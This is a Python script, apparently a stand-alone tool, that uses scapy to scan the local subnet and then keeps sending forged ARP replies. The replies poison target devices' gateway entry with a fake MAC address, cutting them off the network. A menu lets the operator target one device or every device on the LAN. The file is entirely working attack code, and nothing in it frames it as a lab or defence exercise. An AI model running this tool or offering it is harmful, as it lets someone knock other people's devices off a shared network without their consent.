import time
from scapy.all import arping, logging, ARP, send, socket
from threading import Thread
import os

class DeviceThread(Thread):
    def __init__(self, target_ip, target_mac, gateway_ip, gateway_mac):
        Thread.__init__(self)
        self.target_ip = target_ip
        self.target_mac = target_mac
        self.gateway_ip = gateway_ip
        self.gateway_mac = gateway_mac

    def spoof(self):
        packet = ARP(op=2, psrc=self.gateway_ip, hwsrc='12:34:56:78:9A:BC', pdst=self.target_ip, hwdst=self.target_mac)
        send(packet, verbose = False)
    
    def restore(self): 
        packet = ARP(op=2, psrc=self.gateway_ip, hwsrc=self.gateway_mac, pdst=self.target_ip, hwdst=self.target_mac)
        send(packet, verbose = False) 
    
    def run(self):
        global threads
        while threads[self.target_ip]:
            self.spoof()
        self.restore()

class ARPSpoofing:
    def __init__(self):
        self.update_info()

    def update_info(self):
        self.ips_macs, self.gateway_ip, self.gateway_mac = self.network_info()

    def get_lan_ip(self):
        # A hacky method to get the current lan ip address. It requires internet access, but it works
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("google.com", 80))
        ip = s.getsockname()
        s.close()
        return ip[0]

    def get_ips_macs(self, ips):
        # Returns a list of tupples containing the (ip, mac address) of all of the computers on the network
        answers, uans = arping(ips, verbose=0)
        ip_mac = {}
        for answer in answers:
            ip, mac = answer[1].psrc, answer[1].hwsrc
            ip_mac[ip] = mac
        return ip_mac

    def network_info(self):
        # Use the current ip XXX.XXX.XXX.XXX and get a string in
        # the form "XXX.XXX.XXX.*" and "XXX.XXX.XXX.1". Right now,
        # the script assumes that the default gateway is "XXX.XXX.XXX.1"

        my_ip = self.get_lan_ip()
        ip_list = my_ip.split('.')

        del ip_list[-1]
        ip_list.append('0/24')
        ip_range = '.'.join(ip_list)

        del ip_list[-1]
        ip_list.append('1')
        gateway_ip = '.'.join(ip_list)

        ips_macs = self.get_ips_macs(ip_range)
        gateway_mac = ips_macs[gateway_ip]
        del ips_macs[gateway_ip]
        return ips_macs, gateway_ip, gateway_mac

    def get_mac(self, ip):
        return self.ips_macs[ip]
    
    ###########################################################

    def add_target(self):
        self.update_info()
        devices, count = [], 0
        global threads
        for ip in self.ips_macs:
            mac = self.ips_macs[ip]
            if(not ip in threads):
                print(f"{count} -> {ip} - {mac}")
                devices.append((ip, mac))
                count += 1
        choice = input("Do you wanna turn one of these devices in a target?(y/n) ")
        if (choice == "y"):
            index = int(input("Choose a target to remove? "))
            target_ip, target_mac = devices[index]
            threads[target_ip] = True
            thread = DeviceThread(target_ip, target_mac, self.gateway_ip, self.gateway_mac)
            thread.start()
        os.system("clear")
        

    def add_all(self):
        self.update_info()
        devices, count = [], 0
        global threads
        for ip in self.ips_macs:
            mac = self.ips_macs[ip]
            if((ip in threads and not threads[ip]) or not ip in threads):
                print(f"{count} -> {ip} - {mac}")
                devices.append((ip, mac))
                count += 1
        for target_ip, target_mac in devices:
            threads[target_ip] = True
            thread = DeviceThread(target_ip, target_mac, self.gateway_ip, self.gateway_mac)
            thread.start()
        os.system("clear")
    
    def remove_target(self):
        devices, count = [], 0
        global threads
        for ip in threads:
            if (threads[ip]):
                print(f"{count} -> {ip}")
                devices.append(ip)
                count += 1
        choice = int(input("Choose a target to remove: "))
        ip = devices[choice]
        threads[ip] = False
        os.system("clear")
    
    def list_targets(self):
        global threads
        count = 0
        for ip in threads.keys():
            if (threads[ip]):
                print(f"{count} -> {ip}")
                count += 1
        input()
        os.system("clear")

    def menu(self):
        print("0 - Add a target")
        print("1 - Add All")
        print("2 - Remove a target")
        print("3 - List Targets")
        print("4 - Quit")
        choice = int(input("Choose an option: "))
        os.system("clear")
        if (choice == 0):
            self.add_target()
        elif (choice == 1):
            self.add_all()
        elif (choice == 2):
            self.remove_target()
        elif (choice == 3):
            self.list_targets()
        elif (choice == 4):
            return True
        else:
            print("Select a valid option!")
        return False
    
    def start(self):
        stop = False
        while (not stop):
            stop = self.menu()

threads = {}
arp_sp = ARPSpoofing()
arp_sp.start()